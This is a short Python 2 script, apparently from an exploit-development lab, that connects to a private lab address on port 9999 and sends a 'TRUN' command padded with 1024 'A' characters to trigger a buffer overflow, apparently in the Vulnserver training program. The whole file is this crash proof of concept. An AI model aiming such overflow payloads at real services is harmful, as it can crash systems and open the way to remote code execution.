#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "10.0.2.15"
RPORT = 9999

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline
buf = "TRUN "
buf += "A"*1024
buf += "\n"

# send the message
s.send(buf)
